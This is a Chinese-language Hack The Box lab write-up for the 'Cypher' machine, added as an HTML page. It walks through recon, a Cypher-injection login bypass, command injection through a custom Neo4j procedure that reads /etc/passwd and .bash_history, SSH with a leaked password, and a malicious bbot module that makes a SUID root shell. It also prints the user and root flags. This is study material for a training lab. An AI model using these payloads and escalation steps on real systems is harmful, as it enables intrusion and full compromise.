@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Cypher — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-linux{color:var(--linux)}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+h4{font-size:0.95rem;font-weight:600;color:var(--heading);margin:1.4rem 0 0.6rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='cypher'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>Cypher</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-linux">Linux</span>
+<span>10.129.231.244</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">Cypher 注入绕过登录</span><span class="arrow">→</span><span class="node node-green">APOC 存储过程命令注入</span><span class="arrow">→</span><span class="node node-green">.bash_history 泄露密码 → SSH graphasm</span><span class="arrow">→</span><span class="node node-red">sudo bbot 恶意模块 → root</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描与 Web 探索</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.231.244</pre>
+
+<pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0 (Ubuntu) — GRAPH ASM</pre>
+
+<p>网站 <code>http://cypher.htb/</code> 是一个名为"GRAPH ASM"的攻击面管理平台，自称使用"proprietary graph technology"。</p>
+
+<pre>gobuster dir -u http://cypher.htb/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt --exclude-length 178</pre>
+
+<p>发现 <code>/testing/</code> 目录下有 <code>custom-apoc-extension-1.0-SNAPSHOT.jar</code> 文件。</p>
+
+<h2><span class="phase phase-foothold">立足点</span> Cypher 注入 → 自定义存储过程命令注入</h2>
+
+<h3>发现 Cypher 注入</h3>
+<p>在登录页面输入用户名 <code>admin' -- -</code>，密码任意，触发错误信息泄露完整的 Cypher 查询：</p>
+
+<pre>MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = 'admin' -- -' return h.value as hash</pre>
+
+<p>确认后端使用 <strong>Neo4j</strong> 图数据库，查询语言为 <strong>Cypher</strong>，且用户输入直接拼接到查询中。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：Cypher 是图数据库 Neo4j 的查询语言，就像 SQL 是关系数据库的查询语言一样。这里的注入原理和 SQL 注入完全一样——用户输入被直接拼到查询语句里，攻击者可以闭合引号、插入自己的查询逻辑。</div>
+
+<h3>Cypher 注入绕过登录</h3>
+<p>应用的认证逻辑是：用 Cypher 查询用户的 SHA1 哈希，然后与输入密码的 SHA1 对比。我们用 UNION 注入返回一个已知密码的 SHA1 值。</p>
+
+<p><code>SHA1("a")</code> = <code>86f7e437faa5a7fce15d1ddcb9eaeaea377667b8</code></p>
+
+<h4>用户名</h4>
+<pre>' OR true RETURN "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8" as hash LIMIT 1 UNION MATCH (u:USER)-[:SECRET]-&gt;(h:SHA1) WHERE u.name = '</pre>
+
+<h4>密码</h4>
+<pre>a</pre>
+
+<h4>拼接后的完整查询</h4>
+<pre>MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = '' OR true
+RETURN "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8" as hash LIMIT 1
+UNION MATCH (u:USER)-[:SECRET]-&gt;(h:SHA1) WHERE u.name = ''
+return h.value as hash</pre>
+
+<p>第一段 <code>OR true</code> 匹配所有用户，返回我们控制的 SHA1 值；<code>LIMIT 1</code> 确保只返回一条结果；第二段 <code>WHERE u.name = ''</code> 返回空，不影响结果。应用将 SHA1("a") 与返回的哈希对比 → 匹配 → 登录成功。</p>
+
+<h3>自定义 APOC 扩展命令注入</h3>
+<p>下载 <code>/testing/custom-apoc-extension-1.0-SNAPSHOT.jar</code> 并反编译，发现自定义存储过程 <code>custom.getUrlStatusCode</code> 内部调用了 <code>Runtime.exec()</code>，且参数未过滤——存在命令注入。</p>
+
+<p>通过 Cypher 注入调用该存储过程执行系统命令：</p>
+
+<pre>CALL custom.getUrlStatusCode('example.com; whoami')</pre>
+
+<pre>{"statusCode": "000neo4j"}</pre>
+
+<p>命令执行成功，当前用户为 <code>neo4j</code>。</p>
+
+<h3>读取系统信息</h3>
+<pre>CALL custom.getUrlStatusCode('example.com; cat /etc/passwd|grep bash| tail -2')</pre>
+
+<pre>graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
+neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash</pre>
+
+<h3>读取 bash 历史获取密码</h3>
+<pre>CALL custom.getUrlStatusCode('example.com; cat /var/lib/neo4j/.bash_history')</pre>
+
+<pre>neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK</pre>
+
+<div class="callout">🧒 <strong>儿童版</strong>：neo4j 用户之前在命令行里设置过数据库密码，这条命令被记录在了 bash 历史文件里。我们通过命令注入读到了这个历史记录，拿到了密码。</div>
+
+<h3>SSH 登录</h3>
+<p>密码 <code>cU4btyib.20xtCMCXkBmerhK</code> 对 neo4j 用户 SSH 无效，但对 <strong>graphasm</strong> 用户有效（密码复用）：</p>
+
+<pre>ssh graphasm@cypher.htb
+# 密码: cU4btyib.20xtCMCXkBmerhK</pre>
+
+<pre>graphasm@cypher:~$ cat user.txt
+c2f545cbeee7fa7c189894e600a3a53c</pre>
+
+<h2><span class="phase phase-privesc">权限提升</span> sudo bbot 自定义模块加载</h2>
+
+<h3>检查 sudo 权限</h3>
+<pre>graphasm@cypher:~$ sudo -l
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot</pre>
+
+<p><strong>BBOT</strong>（Bionic Baboon Information Gathering Tool）是一款模块化信息收集工具，支持通过 YAML 配置文件加载自定义 Python 模块。</p>
+
+<h3>编写恶意模块</h3>
+
+<h4>创建配置文件 /tmp/my_present.yml</h4>
+<pre>modules:
+- mymodule
+module_dirs:
+- /tmp/my_modules</pre>
+
+<h4>创建恶意模块 /tmp/my_modules/mymodule.py</h4>
+<pre>from bbot.modules.base import BaseModule
+import os
+os.system("cp /bin/bash /tmp/rootbash;chmod 6777 /tmp/rootbash")
+
+class MyModule(BaseModule):
+    watched_events = ["DNS_NAME"]
+    async def handle_event(self, event):
+        pass</pre>
+
+<div class="callout">🧒 <strong>儿童版</strong>：bbot 是一个安全扫描工具，它允许加载自定义的"插件模块"。管理员给了 graphasm <code>sudo bbot</code> 的权限，本意是让他做安全扫描。但我们写了一个假插件——里面不是扫描代码，而是"复制一个 root 权限的 bash"。bbot 以 root 身份加载这个插件时，恶意代码就被执行了。</div>
+
+<h3>执行提权</h3>
+<pre>sudo /usr/local/bin/bbot -p /tmp/my_present.yml --force</pre>
+
+<pre>graphasm@cypher:/tmp$ ls -la rootbash
+-rwsrwsrwx 1 root root 1446024 Sep 10 14:24 rootbash
+
+graphasm@cypher:/tmp$ ./rootbash -p
+
+rootbash-5.2# cat /root/root.txt
+758e70b866703bcc09de44239ca672c4</pre>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>Cypher 注入和 SQL 注入语法不同：Cypher 用 <code>MATCH ... WHERE ... RETURN</code>，不是 <code>SELECT ... FROM ... WHERE</code></p>
+<p><code>UNION</code> 在 Cypher 中要求两边返回相同的列名（本例中都是 <code>hash</code>）</p>
+<p><code>LIMIT 1</code> 很重要——如果应用检查结果数量，返回多条会导致失败</p>
+<p>自定义存储过程的命令注入输出会拼接在 <code>statusCode</code> 字段前面的 <code>000</code> 后面</p>
+<p>bbot 的 <code>--force</code> 参数用于跳过确认提示</p>
+</div>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具</th><th>助记词</th></tr>
+<tr><td>信息收集</td><td>错误信息泄露后端技术栈</td><td>登录页面 + 错误回显</td><td>🔍 "报错暴露查询"</td></tr>
+<tr><td>立足点</td><td>Cypher 注入（图数据库注入）</td><td>UNION + 控制返回哈希</td><td>💉 "图数据库也能注"</td></tr>
+<tr><td>命令执行</td><td>自定义 APOC 存储过程 RCE</td><td>custom.getUrlStatusCode</td><td>🔧 "存储过程藏后门"</td></tr>
+<tr><td>凭据获取</td><td>bash 历史记录泄露密码</td><td>.bash_history</td><td>📜 "历史记录偷密码"</td></tr>
+<tr><td>权限提升</td><td>sudo bbot 恶意模块加载</td><td>自定义 Python 模块 + SUID bash</td><td>🤖 "假插件真提权"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>Cypher 注入 vs SQL 注入</h3>
+<table>
+<tr><th>对比项</th><th>SQL 注入</th><th>Cypher 注入</th></tr>
+<tr><td>数据库类型</td><td>关系数据库（MySQL, PostgreSQL）</td><td>图数据库（Neo4j）</td></tr>
+<tr><td>查询语法</td><td><code>SELECT * FROM users WHERE name = '...'</code></td><td><code>MATCH (u:USER) WHERE u.name = '...' RETURN u</code></td></tr>
+<tr><td>联合查询</td><td><code>UNION SELECT</code></td><td><code>UNION MATCH ... RETURN</code></td></tr>
+<tr><td>注释符</td><td><code>-- </code>、<code>#</code>、<code>/* */</code></td><td><code>//</code>（行注释）</td></tr>
+<tr><td>存储过程</td><td><code>CALL xp_cmdshell(...)</code></td><td><code>CALL custom.xxx(...)</code></td></tr>
+<tr><td>核心原理</td><td>用户输入拼接到查询语句</td><td>完全相同</td></tr>
+</table>
+
+<p>Cypher 注入在实战中相对少见，但随着图数据库（Neo4j、Amazon Neptune）的普及，这类漏洞正在增多。核心防御方式与 SQL 注入相同：使用参数化查询。</p>
+
+<h3>BBOT 安全风险</h3>
+<p>BBOT 的 <code>module_dirs</code> 功能允许从任意目录加载 Python 模块。当 bbot 以 <code>sudo</code> 运行时，加载的模块代码也以 root 权限执行。这与 <code>sudo pip install</code>、<code>sudo composer run-script</code> 等属于同类提权向量——任何允许加载/执行用户可控代码的工具，配合 sudo 都是危险的。</p>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Cypher 攻略 · 2026</footer>
+</body></html>
